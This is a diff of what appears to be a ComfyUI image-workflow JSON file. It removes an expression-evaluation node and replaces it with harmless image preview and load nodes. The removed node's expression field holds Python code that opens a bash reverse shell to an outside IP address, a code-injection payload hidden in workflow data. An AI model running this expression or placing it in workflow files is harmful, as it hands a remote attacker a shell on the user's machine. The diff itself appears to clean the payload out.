@@ -1,44 +1,24 @@
 {
-  "1": {
+  "4": {
     "inputs": {
-      "expression": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
-      "input_count": 1,
-      "print_to_console": "False",
-      "update": null,
-      "in1": [
-        "2",
+      "images": [
+        "5",
         0
       ]
     },
-    "class_type": "EvaluateMultiple1",
+    "class_type": "PreviewImage",
     "_meta": {
-      "title": "EvaluateMultiple1"
+      "title": "预览图像"
     }
   },
-  "2": {
+  "5": {
     "inputs": {
-      "Value_A": 0.0,
-      "Value_B": 1.0,
-      "seed": 492930603
+      "image": "empty.png [output]",
+      "refresh": "refresh"
     },
-    "class_type": "DF_Random",
+    "class_type": "LoadImageOutput",
     "_meta": {
-      "title": "Random"
-    }
-  },
-  "3": {
-    "inputs": {
-      "preview_markdown": "",
-      "preview_text": "",
-      "previewMode": null,
-      "source": [
-        "1",
-        0
-      ]
-    },
-    "class_type": "PreviewAny",
-    "_meta": {
-      "title": "预览任意"
+      "title": "加载图像（来自输出）"
     }
   }
 }
